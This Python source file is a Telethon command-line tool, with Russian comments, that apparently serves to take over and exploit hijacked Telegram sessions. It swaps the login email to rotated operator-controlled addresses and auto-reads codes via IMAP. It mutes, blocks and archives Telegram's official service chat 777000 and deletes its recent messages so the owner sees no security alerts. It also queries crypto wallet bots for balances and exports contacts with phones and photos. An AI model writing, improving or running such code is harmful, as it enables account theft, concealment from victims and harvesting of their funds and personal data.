import argparse
import asyncio
import json
import os
import re
from typing import Optional, List

from dotenv import load_dotenv
from telethon import TelegramClient, errors, functions, types

from .logging_utils import get_logger
from .email_utils import fetch_latest_code
from .patterns import export_patterns


MASK_EMAIL_RE = re.compile(r"(^.)(.*)(.$)")


def mask_email(email: str) -> str:
    try:
        name, domain = email.split("@", 1)
        name_masked = name[0] + ("*" * max(1, len(name) - 2)) + (name[-1] if len(name) > 1 else "")
        parts = domain.split(".")
        if parts:
            parts[0] = parts[0][0] + ("*" * max(1, len(parts[0]) - 1))
        return name_masked + "@" + ".".join(parts)
    except Exception:
        return email


async def get_self_phone(client: TelegramClient, logger) -> Optional[str]:
    try:
        me = await client.get_me()
        return getattr(me, "phone", None)
    except Exception as e:
        logger.warning("Не удалось получить номер текущего аккаунта: %s", e)
        return None


async def ensure_authorized(client: TelegramClient, phone: Optional[str], logger) -> None:
    if await client.is_user_authorized():
        return
    if not phone:
        raise RuntimeError("Требуется --phone для первичной авторизации (нет .session)")

    logger.info("Первичная авторизация для номера %s", phone)
    sent = await client(functions.auth.SendCodeRequest(
        phone_number=phone,
        api_id=client.api_id,
        api_hash=client.api_hash,
        settings=types.CodeSettings(
            allow_flashcall=False,
            current_number=True,
            allow_app_hash=True,
            allow_missed_call=False,
            logout_tokens=[],
        ),
    ))
    phone_code = input("Введите код из Telegram (SMS/приложение): ").strip()
    await client(functions.auth.SignInRequest(
        phone_number=phone,
        phone_code_hash=sent.phone_code_hash,
        phone_code=phone_code,
    ))


async def change_login_email(
    client: TelegramClient,
    new_email: str,
    api_id: int,
    api_hash: str,
    imap_server: str,
    gmail_address: str,
    gmail_app_password: str,
    logger,
) -> None:
    logger.info("Запрошена смена login email -> %s", new_email)

    # Попытка смены (если уже установлен)
    try:
        logger.info("Проверка: установлен ли текущий login email (loginChange)")
        sent = await client(functions.account.SendVerifyEmailCodeRequest(
            purpose=types.EmailVerifyPurposeLoginChange(),
            email=new_email,
        ))
        logger.info("Код подтверждения отправлен на адрес: %s", getattr(sent, "email_pattern", mask_email(new_email)))
        code = fetch_latest_code(imap_server, gmail_address, gmail_app_password)
        if not code:
            code = input("Введите код из e-mail: ").strip()
        await client(functions.account.VerifyEmailRequest(
            purpose=types.EmailVerifyPurposeLoginChange(),
            verification=types.EmailVerificationCode(code=code),
        ))
        logger.info("Успешно изменён login email на: %s", mask_email(new_email))
        return
    except errors.EmailNotSetupError:
        logger.info("Login email ещё не установлен — выполняем первичную установку (loginSetup)")
    except errors.EmailInvalidError:
        logger.error("Указан некорректный email: %s", new_email)
        return
    except errors.EmailNotAllowedError:
        logger.error("Этот email нельзя использовать для операции (EMAIL_NOT_ALLOWED): %s", new_email)
        return
    except errors.FloodWaitError as fw:
        logger.error("FloodWait при отправке кода на email: подождите %s секунд.", fw.seconds)
        return
    except Exception as e:
        logger.exception("Неожиданная ошибка при попытке смены login email: %s", e)
        return

    # Первичная установка (loginSetup)
    phone = await get_self_phone(client, logger)
    if not phone:
        phone = input("Введите номер телефона аккаунта (для loginSetup): ").strip()

    try:
        logger.info("Получаем phone_code_hash через auth.sendCode для номера %s", phone)
        sent_code = await client(functions.auth.SendCodeRequest(
            phone_number=phone,
            api_id=api_id,
            api_hash=api_hash,
            settings=types.CodeSettings(
                allow_flashcall=False,
                current_number=True,
                allow_app_hash=True,
                allow_missed_call=False,
                logout_tokens=[],
            ),
        ))
        phone_code_hash = sent_code.phone_code_hash
        logger.debug("Получен phone_code_hash=%s", phone_code_hash)

        logger.info("Отправляем код подтверждения на email (loginSetup)")
        sent = await client(functions.account.SendVerifyEmailCodeRequest(
            purpose=types.EmailVerifyPurposeLoginSetup(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
            ),
            email=new_email,
        ))
        logger.info("Код отправлен на адрес: %s", getattr(sent, "email_pattern", mask_email(new_email)))

        code = fetch_latest_code(imap_server, gmail_address, gmail_app_password)
        if not code:
            code = input("Введите код из e-mail: ").strip()

        await client(functions.account.VerifyEmailRequest(
            purpose=types.EmailVerifyPurposeLoginSetup(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
            ),
            verification=types.EmailVerificationCode(code=code),
        ))
        logger.info("Login email установлен: %s", mask_email(new_email))
    except errors.EmailInvalidError:
        logger.error("Указан некорректный email: %s", new_email)
    except errors.EmailNotAllowedError:
        logger.error("Этот email нельзя использовать для операции (EMAIL_NOT_ALLOWED): %s", new_email)
    except errors.FloodWaitError as fw:
        logger.error("FloodWait при loginSetup: подождите %s секунд и повторите.", fw.seconds)
    except errors.PhoneNumberInvalidError:
        logger.error("Телефонный номер некорректен для loginSetup: %s", phone)
    except errors.PhoneCodeInvalidError:
        logger.error("Неверный телефонный код (phone_code) при loginSetup.")
    except errors.PhoneCodeExpiredError:
        logger.error("Телефонный код просрочен при loginSetup.")
    except Exception as e:
        logger.exception("Ошибка при первичной установке login email: %s", e)


async def notifications_off(client: TelegramClient, logger) -> None:
    # 1. найти чат Telegram 777000
    try:
        entity = await client.get_entity(777000)
    except Exception:
        entity = await client.get_entity('777000')
    input_peer = await client.get_input_entity(entity)

    # 2. отключить уведомления
    try:
        logger.info("Отключаем уведомления для 777000")
        settings = types.InputPeerNotifySettings(
            mute_until=2**31 - 1,  # максимальная заглушка
            show_previews=False,
            silent=True,
            stories_muted=True,
        )
        await client(functions.account.UpdateNotifySettingsRequest(
            peer=types.InputNotifyPeer(peer=input_peer),
            settings=settings,
        ))
        logger.info("Уведомления отключены")
    except Exception as e:
        logger.exception("Сбой отключения уведомлений: %s", e)

    # 3. заблокировать чат
    try:
        logger.info("Блокируем 777000")
        await client(functions.contacts.BlockRequest(id=input_peer))
        logger.info("Чат заблокирован")
    except Exception as e:
        logger.exception("Сбой блокировки чата: %s", e)

    # 4. удалить 5 последних сообщений
    try:
        logger.info("Удаляем 5 последних сообщений")
        hist = await client(functions.messages.GetHistoryRequest(peer=input_peer, limit=5, add_offset=0, offset_id=0, max_id=0, min_id=0, hash=0))
        ids = [m.id for m in hist.messages]
        if ids:
            await client(functions.messages.DeleteMessagesRequest(id=ids, revoke=True))
            logger.info("Удалено сообщений: %d", len(ids))
        else:
            logger.info("Нет сообщений для удаления")
    except Exception as e:
        logger.exception("Сбой удаления сообщений: %s", e)

    # 5. архивировать чат (folder_id=1)
    try:
        logger.info("Архивируем чат 777000")
        await client(functions.folders.EditPeerFoldersRequest(
            folder_peers=[types.InputFolderPeer(peer=input_peer, folder_id=1)],
        ))
        logger.info("Чат перемещён в архив")
    except Exception as e:
        logger.exception("Сбой архивирования чата: %s", e)


async def avatar(client: TelegramClient, export_dir: str, logger) -> None:
    try:
        me = await client.get_me()
        photos = await client(functions.photos.GetUserPhotosRequest(
            user_id=await client.get_input_entity(me),
            offset=0,
            max_id=0,
            limit=1,
        ))
        if not photos.photos:
            logger.info("У аккаунта нет аватарки")
            return
        os.makedirs(export_dir, exist_ok=True)
        path = os.path.join(export_dir, "avatar")
        await client.download_media(photos.photos[0], file=path)
        logger.info("Аватарка сохранена в: %s", path)
    except Exception as e:
        logger.exception("Не удалось выгрузить аватарку: %s", e)


BALANCE_RE = re.compile(r"\b(?P<amount>\d+[\d\., ]*)(?P<coin>USDT|BTC|ETH|TON|TRX|BNB|SOL)\b", re.IGNORECASE)


async def balance(client: TelegramClient, bots_csv: str, cmds_csv: str, export_dir: str, logger) -> None:
    bots = [b.strip() for b in bots_csv.split(',') if b.strip()]
    cmds = [c.strip() for c in cmds_csv.split(',') if c.strip()]
    if not bots:
        logger.warning("CRYPTO_WALLET_BOTS пуст — пропуск")
        return
    if not cmds:
        cmds = ["balance", "wallet"]

    os.makedirs(export_dir, exist_ok=True)
    report = {}

    for bot in bots:
        try:
            entity = await client.get_entity(bot)
        except Exception as e:
            logger.warning("Не удалось получить сущность бота %s: %s", bot, e)
            continue

        # Проверяем, есть ли история
        hist = await client(functions.messages.GetHistoryRequest(peer=entity, limit=1, add_offset=0, offset_id=0, max_id=0, min_id=0, hash=0))
        if not hist.messages:
            logger.info("%s: нет истории — пропуск", bot)
            continue

        # Пошлём команду и подождём ответ
        reply_text = None
        for cmd in cmds:
            try:
                await client.send_message(entity, cmd)
                await asyncio.sleep(2.0)
                msgs = await client.get_messages(entity, limit=3)
                for m in msgs:
                    if m.message and m.from_id and getattr(m.from_id, 'user_id', None) == entity.id:
                        reply_text = m.message
                        break
                if reply_text:
                    break
            except Exception:
                continue

        if not reply_text:
            logger.info("%s: не удалось получить ответ на команды %s", bot, cmds)
            continue

        # Парсим балансы
        balances = []
        for m in BALANCE_RE.finditer(reply_text):
            amt = m.group('amount').replace(' ', '').replace(',', '.')
            coin = m.group('coin').upper()
            balances.append({"coin": coin, "amount": amt})

        report[bot] = {
            "raw": reply_text,
            "balances": balances,
        }
        logger.info("%s: извлечено %d значений баланса", bot, len(balances))

    with open(os.path.join(export_dir, "balances.json"), "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    logger.info("Отчёт по балансам записан")


async def export_contacts(client: TelegramClient, export_dir: str, with_photos: bool, logger) -> None:
    os.makedirs(export_dir, exist_ok=True)
    res = await client(functions.contacts.GetContactsRequest(hash=0))
    rows = []
    for u in res.users:
        row = {
            "id": u.id,
            "first_name": u.first_name,
            "last_name": u.last_name,
            "username": u.username,
            "phone": u.phone,
            "bot": getattr(u, 'bot', False),
        }
        rows.append(row)
        if with_photos:
            try:
                await client.download_profile_photo(u, file=os.path.join(export_dir, f"{u.id}_photo"))
            except Exception:
                pass

    with open(os.path.join(export_dir, "contacts.json"), "w", encoding="utf-8") as f:
        json.dump(rows, f, ensure_ascii=False, indent=2)
    logger.info("Экспорт контактов: %d записей", len(rows))


def next_email_round_robin(session_dir: str, emails: List[str]) -> str:
    os.makedirs(session_dir, exist_ok=True)
    idx_file = os.path.join(session_dir, "email_rr_index.json")
    idx = 0
    try:
        if os.path.exists(idx_file):
            with open(idx_file, "r", encoding="utf-8") as f:
                data = json.load(f)
                idx = int(data.get("index", 0))
        email = emails[idx % len(emails)]
        with open(idx_file, "w", encoding="utf-8") as f:
            json.dump({"index": (idx + 1) % len(emails)}, f)
        return email
    except Exception:
        return emails[0]


async def main_async():
    load_dotenv()

    parser = argparse.ArgumentParser(description="Telethon CLI")
    parser.add_argument("--session", required=True, help="Имя файла сессии без .session")
    parser.add_argument("--phone", help="Номер телефона для первичной авторизации")
    sub = parser.add_subparsers(dest="command", required=True)

    sub.add_parser("notifications-off")
    sub.add_parser("patterns")
    sub.add_parser("avatar")
    sub.add_parser("balance")
    sub.add_parser("export-contacts")
    sub.add_parser("export-contacts-photos")
    sub.add_parser("change-login-email")

    args = parser.parse_args()

    api_id = int(os.getenv("API_ID", "0") or 0)
    api_hash = os.getenv("API_HASH", "")
    session_base_dir = os.getenv("SESSION_DIR", "telegram-sessions")
    session_path = os.path.join(session_base_dir, args.session)
    os.makedirs(session_base_dir, exist_ok=True)

    logger = get_logger(os.path.join(session_base_dir, args.session), args.session)

    if not api_id or not api_hash:
        raise SystemExit("Не заданы API_ID/API_HASH в .env")

    client = TelegramClient(session_path, api_id, api_hash)
    await client.connect()
    try:
        await ensure_authorized(client, args.phone, logger)

        if args.command == "change-login-email":
            emails_csv = os.getenv("EMAIL_LIST", "")
            emails = [x.strip() for x in emails_csv.split(',') if x.strip()]
            if not emails:
                raise SystemExit("EMAIL_LIST пуст в .env")
            new_email = next_email_round_robin(os.path.join(session_base_dir, args.session), emails)
            imap_server = os.getenv("IMAP_SERVER", "imap.gmail.com")
            gmail_address = os.getenv("GMAIL_ADDRESS", "")
            gmail_app_password = os.getenv("GMAIL_APP_PASSWORD", "")
            await change_login_email(client, new_email, api_id, api_hash, imap_server, gmail_address, gmail_app_password, logger)

        elif args.command == "notifications-off":
            await notifications_off(client, logger)

        elif args.command == "patterns":
            patterns_csv = os.getenv("SEARCH_PATTERNS", "")
            export_dir = os.path.join(session_base_dir, args.session, "exports", "patterns")
            await export_patterns(client, export_dir, patterns_csv, logger)

        elif args.command == "avatar":
            export_dir = os.path.join(session_base_dir, args.session)
            await avatar(client, export_dir, logger)

        elif args.command == "balance":
            bots_csv = os.getenv("CRYPTO_WALLET_BOTS", "")
            cmds_csv = os.getenv("CRYPTO_BALANCE_COMMANDS", "balance,wallet")
            export_dir = os.path.join(session_base_dir, args.session, "exports", "balance")
            await balance(client, bots_csv, cmds_csv, export_dir, logger)

        elif args.command == "export-contacts":
            export_dir = os.path.join(session_base_dir, args.session, "exports", "contacts")
            await export_contacts(client, export_dir, with_photos=False, logger=logger)

        elif args.command == "export-contacts-photos":
            export_dir = os.path.join(session_base_dir, args.session, "exports", "contacts_with_photos")
            await export_contacts(client, export_dir, with_photos=True, logger=logger)

    finally:
        await client.disconnect()


def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
